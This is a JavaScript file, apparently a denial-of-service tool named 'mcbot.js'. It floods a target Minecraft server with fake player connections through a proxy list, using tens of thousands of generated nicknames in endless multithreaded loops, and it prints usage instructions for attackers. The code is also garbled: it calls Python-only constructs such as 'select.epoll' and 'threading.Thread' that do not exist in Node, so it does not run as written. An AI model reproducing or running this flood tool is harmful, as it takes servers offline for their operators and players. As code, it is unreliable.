const net = require('net');
const { execSync } = require('child_process');

function packVarint(d) {
  let o = Buffer.from('');
  while (true) {
    const b = d & 0x7F;
    d >>= 7;
    o = Buffer.concat([o, Buffer.from([(b | (0x80 & (d > 0 ? 0xFF : 0)))])]);
    if (d === 0) break;
  }
  return o;
}

function unpackVarint(s) {
  let d = 0;
  let l = 0;
  let length = s.length;
  if (length > 5) length = 5;
  for (let i = 0; i < length; i++) {
    l += 1;
    const b = s[i];
    d |= (b & 0x7F) << (7 * i);
    if (!(b & 0x80)) break;
  }
  return [d, s.slice(l)];
}

function packData(d) {
  return Buffer.concat([packVarint(d.length), Buffer.from(d)]);
}

function packPort(i) {
  const buf = Buffer.alloc(2);
  buf.writeUInt16BE(i);
  return buf;
}

function stringPack(string) {
  return packData(Buffer.from(string, 'utf8'));
}

function dataUnpack(bytes) {
  const [length, rest] = unpackVarint(bytes);
  return [rest.slice(0, length), rest.slice(length)];
}

function stringUnpack(bytes) {
  const [string, rest] = dataUnpack(bytes);
  return [string.toString('utf8'), rest];
}

function structUnpack(format, struc) {
  const data = Buffer.from(struc).slice(0, struct.calcSize(format));
  const rest = Buffer.from(struc).slice(struct.calcSize(format));
  return [data, rest];
}

const proxyTypes = ['socks', 'http'];

try {
  execSync('ulimit -n 1040000');
} catch {}

if (process.argv[2] === 'help') {
  console.log(`
  Usage:

  node mcbot.js <ip> <port> <proxy file> <proxy type> <threads> <minecraft version protocol>
  `);
}

try {
  const ip = process.argv[2];
  const port = parseInt(process.argv[3]);
  const proxyFile = process.argv[4];
  const proxyVer = process.argv[5];
  const threadNum = parseInt(process.argv[6]);
  const protocol = parseInt(process.argv[7]);
} catch {
  console.log('Not enough args ?');
  process.exit(1);
}

if (process.argv.length < 8 || process.argv.length > 8) {
  console.log(`
  Usage:

  node mcbot.js <ip> <port> <proxy file> <proxy type> <threads> <minecraft version protocol>
  `);
  process.exit(1);
}

const proxyList = require('fs').readFileSync(proxyFile, 'utf-8').split('\n');
const proxy = [];

for (const line of proxyList) {
  for (let i = 0; i < 40; i++) {
    proxy.push(line);
  }
}

const nicklist = [];

for (let i = 0; i < 500000; i++) {
  nicklist.push('Mc' + i + '\n');
}

let payload;

if (proxyVer === 'socks') {
  payload = Buffer.concat([Buffer.from([4, 1]), packPort(port), Buffer.from(ip.split('.').map(Number))]);
  payload = Buffer.concat([payload, Buffer.from([0x10, 0x00])]);
} else if (proxyVer === 'http') {
  const payloadArr = [
    Buffer.from('CONNECT ' + ip + ':' + port + ' HTTP/1.1'),
    Buffer.from('Host: ' + ip)
  ];
  payloadArr.push(Buffer.from('\r\n'));
  payload = Buffer.concat(payloadArr);
} else {
  console.log('Proxy Types:\n1. socks\n2. http');
}

const pw = 10000;

console.log('Creating sockets and multiprocesses\nwait some seconds');

const sockets = {};

function attack(epoll) {
  while (true) {
    for (let i = 0; i < pw; i++) {
      const atk = new net.Socket();
      const fl = atk._handle.fd;
      sockets[fl] = [atk, fl];
      atk.setBlocking(false);
      const prox = proxy[Math.floor(Math.random() * proxy.length)].split(':');
      try {
        epoll.register(fl, select.EPOLLOUT | select.EPOLLET);
        atk.connect({ host: prox[0], port: parseInt(prox[1]) });
      } catch (e) {
        if (e.errno === 'EINPROGRESS' || e.errno === 'EWOULDBLOCK' || e.errno === 'EALREADY') {
          // Do nothing
        }
      }
    }
    setTimeout(() => {}, 400);
  }
}

function Joins() {
  const pid = process.fork();
  const epoll = select.epoll();
  const attackThread = new threading.Thread(attack, [epoll]);
  attackThread.start();
  setTimeout(() => {}, 5000);
  console.log('Sending Attack');
  try {
    while (true) {
      const events = epoll.poll({ timeout: 3 });
      for (const [fl, event] of events) {
        const atk = sockets[fl][0];
        if (event & select.EPOLLOUT) {
          try {
            const user = nicklist[Math.floor(Math.random() * nicklist.length)];
            atk.write(payload);
            atk.write(packData(Buffer.concat([Buffer.from([0]), packVarint(protocol), stringPack(ip), packPort(port), packVarint(2)])));
            atk.write(packData(Buffer.concat([Buffer.from([0]), stringPack(user)])));
          } catch {
            epoll.modify(sockets[fl][1], 0);
            atk.destroy();
          }
        }
      }
    }
  } catch {
    process.exit(0);
  }
}

function send2attack() {
  while (true) {
    const threads = [];
    for (let i = 0; i < threadNum; i++) {
      threads.push(new threading.Thread(Joins));
    }
    for (const thd of threads) {
      thd.start();
      setTimeout(() => {}, 50);
    }
    setTimeout(() => {}, 7000);
  }
}

try {
  send2attack();
} catch {
  process.exit(0);
}
